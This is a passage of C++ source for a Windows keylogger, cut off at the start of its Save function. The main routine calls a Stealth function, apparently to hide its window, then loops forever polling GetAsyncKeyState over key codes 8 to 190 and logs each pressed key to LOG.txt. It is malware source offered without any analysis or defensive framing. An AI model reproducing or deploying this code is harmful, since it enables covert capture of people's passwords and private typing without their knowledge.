#include <iostream>
using namespace std;
#include <windows.h>
#include <winuser.h>

int Save(int key_stroke, char *file);
void Stealth();

int main() {
	Stealth();
	char i;

	while (1) {
		for (i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767)
				Save(i, "LOG.txt");
		}
	}
	system("PAUSE");
	return 0;
}

int Save (int key_Stroke, char *file)